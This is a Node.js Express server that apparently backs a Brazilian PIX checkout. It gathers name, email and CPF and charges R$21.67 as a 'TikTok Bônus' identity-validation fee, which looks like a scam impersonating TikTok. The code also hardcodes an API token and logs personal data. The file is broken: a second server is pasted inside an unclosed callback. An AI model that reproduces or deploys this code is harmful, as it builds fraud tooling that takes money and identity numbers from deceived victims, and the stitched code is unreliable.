const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚠️ CONFIGURAÇÃO REAL DA PLUMIFY (SUAS CHAVES)
const PLUMIFY_CONFIG = {
    token: '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa', // SEU TOKEN REAL
    accountId: '9kajnnbn2c', // SEU ACCOUNT ID
    baseURL: 'https://api.plumify.com.br/api/public/v1',
    productHash: 'flnqw8vjsf' // SEU PRODUCT HASH
};

// MIDDLEWARES ESSENCIAIS
app.use(express.json());
app.use(express.static(__dirname));

// CORS PARA PRODUÇÃO
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// HEALTH CHECK (OBRIGATÓRIO PARA RENDER)
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        service: 'TikTok PIX API',
        environment: process.env.NODE_ENV || 'production',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

// ROTA PRINCIPAL
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// TESTE DA API
app.get('/api/test', (req, res) => {
    res.json({
        success: true,
        message: 'API TikTok PIX funcionando!',
        server: 'Render',
        url: 'https://pagamento-cgzk.onrender.com',
        plumify: 'Conectado',
        timestamp: new Date().toISOString()
    });
});

// ⭐⭐ ROTA REAL PARA CRIAR PIX (PRODUÇÃO) ⭐⭐
app.post('/api/pix/create', async (req, res) => {
    console.log('=== INICIANDO CRIAÇÃO DE PIX ===');
    
    try {
        // VALIDAÇÃO DOS DADOS
        const { customerName, customerEmail, customerCpf } = req.body;
        
        if (!customerName || !customerEmail || !customerCpf) {
            console.log('❌ Dados incompletos:', req.body);
            return res.status(400).json({
                success: false,
                error: 'Dados incompletos. Preencha: nome, email e CPF.',
                required: ['customerName', 'customerEmail', 'customerCpf']
            });
        }
        
        // LIMPA CPF
        const cpfClean = customerCpf.replace(/\D/g, '');
        console.log('✅ Dados recebidos:', { customerName, customerEmail, cpfClean });
        
        // PAYLOAD PARA PLUMIFY (REAL)
        const payload = {
            api_token: PLUMIFY_CONFIG.token,
            amount: 2167, // R$ 21,67 em centavos
            payment_method: "pix",
            customer: {
                name: customerName.trim(),
                email: customerEmail.trim(),
                phone_number: "61995512071", // Pode ajustar
                document: cpfClean,
                zip_code: "00000000",
                street_name: "Rua",
                number: "0000",
                complement: "",
                neighborhood: "Bairro",
                city: "Cidade",
                state: "SP",
                country: "br"
            },
            cart: [
                {
                    product_hash: PLUMIFY_CONFIG.productHash,
                    title: "Taxa de Validação de Identidade - TikTok Bônus",
                    price: 2167,
                    quantity: 1,
                    tangible: false,
                    requires_shipping: false,
                    operation_type: 1
                }
            ],
            offer_hash: `tiktok_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
            expire_in_days: 1,
            transaction_origin: "web"
        };
        
        console.log('📤 Enviando para Plumify...');
        console.log('Payload:', JSON.stringify(payload, null, 2));
        
        // CHAMADA REAL PARA API PLUMIFY
        const response = await axios.post(
            `${PLUMIFY_CONFIG.baseURL}/transactions`,
            payload,
            {
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout: 30000 // 30 segundos timeout
            }
        );
        
        console.log('✅ Resposta Plumify - Status:', response.status);
        console.log('Dados:', JSON.stringify(response.data, null, 2));
        
        // PROCESSAMENTO DA RESPOSTA
        const data = response.data;
        
        // VERIFICA SE TEM ERRO NA RESPOSTA
        if (data.error) {
            console.log('❌ Erro na resposta Plumify:', data.error);
            return res.status(400).json({
                success: false,
                error: data.error.message || 'Erro na geração do PIX',
                details: data.error
            });
        }
        
        // FORMATA RESPOSTA PARA FRONTEND
        const result = {
            success: true,
            message: 'PIX gerado com sucesso!',
            transaction: {
                id: data.id || data.hash || `pix_${Date.now()}`,
                status: data.payment_status || 'waiting_payment',
                amount: 21.67,
                amount_cents: 2167,
                pix_code: data.pix?.pix_qr_code || data.qr_code || data.pix_qr_code || '',
                pix_url: data.pix?.pix_url || data.qr_code_image || data.pix_url || '',
                expiration: data.expires_at || new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(),
                created_at: data.created_at || new Date().toISOString()
            }
        };
        
        // SE NÃO TEM URL DO QR CODE, GERA UMA
        if (result.transaction.pix_code && !result.transaction.pix_url) {
            result.transaction.pix_url = 
                `https://api.qrserver.com/v1/create-qr-code/?size=300x300&format=png&data=${encodeURIComponent(result.transaction.pix_code)}`;
        }
        
        console.log('🎯 Resposta final para frontend:', JSON.stringify(result, null, 2));
        
        res.json(result);
        
    } catch (error) {
        console.error('❌ ERRO CRÍTICO NO PIX:');
        console.error('Mensagem:', error.message);
        console.error('Código:', error.code);
        console.error('Resposta:', error.response?.data);
        console.error('Status:', error.response?.status);
        
        // RESPOSTA DE ERRO DETALHADA
        let errorMessage = 'Erro ao gerar PIX';
        let errorDetails = null;
        
        if (error.response) {
            // ERRO DA API PLUMIFY
            errorMessage = error.response.data?.message || error.response.data?.error || `Erro ${error.response.status}`;
            errorDetails = error.response.data;
        } else if (error.request) {
            // SEM RESPOSTA (TIMEOUT, NETWORK ERROR)
            errorMessage = 'Sem resposta do servidor de pagamento. Verifique sua conexão.';
        } else {
            // ERRO DE CONFIGURAÇÃO
            errorMessage = error.message;
        }
        
        res.status(error.response?.status || 500).json({
            success: false,
            error: errorMessage,
            details: errorDetails,
            suggestion: 'Tente novamente em alguns instantes.'
        });
    }
});

// ROTA PARA VERIFICAR STATUS DO PIX
app.get('/api/pix/status/:id', async (req, res) => {
    try {
        const response = await axios.get(
            `${PLUMIFY_CONFIG.baseURL}/transactions/${req.params.id}`,
            {
                headers: {
                    'Authorization': `Bearer ${PLUMIFY_CONFIG.token}`,
                    'Accept': 'application/json'
                }
            }
        );
        
        res.json({
            success: true,
            transaction: response.data
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'Erro ao verificar status'
        });
    }
});

// ROTA PARA CHECKOUT
app.get('/checkout/pagamento', (req, res) => {
    res.sendFile(__dirname + '/checkout/pagamento.html');
});

// ROTA PARA WEBHOOK (OPCIONAL)
app.post('/webhook/plumify', (req, res) => {
    console.log('📩 Webhook recebido:', req.body);
    res.json({ received: true });
});

// MANUSEIO DE ERROS GLOBAIS
app.use((err, req, res, next) => {
    console.error('🔥 Erro global:', err);
    res.status(500).json({
        success: false,
        error: 'Erro interno do servidor',
        requestId: Date.now()
    });
});

// INICIAR SERVIDOR
app.listen(PORT, () => {
    console.log(`
    🚀 TIKTOK PIX API - PRODUÇÃO
    =================================
    ✅ Servidor iniciado na porta: ${PORT}
    🌐 URL: https://pagamento-cgzk.onrender.com
    📊 Health: /health
    💰 PIX: /api/pix/create
    📁 Static: ${__dirname}
    🕐 ${new Date().toISOString()}
    =================================
    `);

require('dotenv').config();
const express = require('express');
const axios = require('axios');

const app = express();
app.use(express.json());

// 🧾 CRIAR PIX (checkout)
app.post('/api/pix/create', async (req, res) => {
  // seu código de criar pix
  res.json({ ok: true });
});

// 🔔 WEBHOOK (Plumify chama sozinho)
app.post('/webhook/plumify', (req, res) => {
  console.log('📩 PAGAMENTO RECEBIDO');
  console.log(req.body);

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('🚀 Servidor rodando na porta', PORT);
});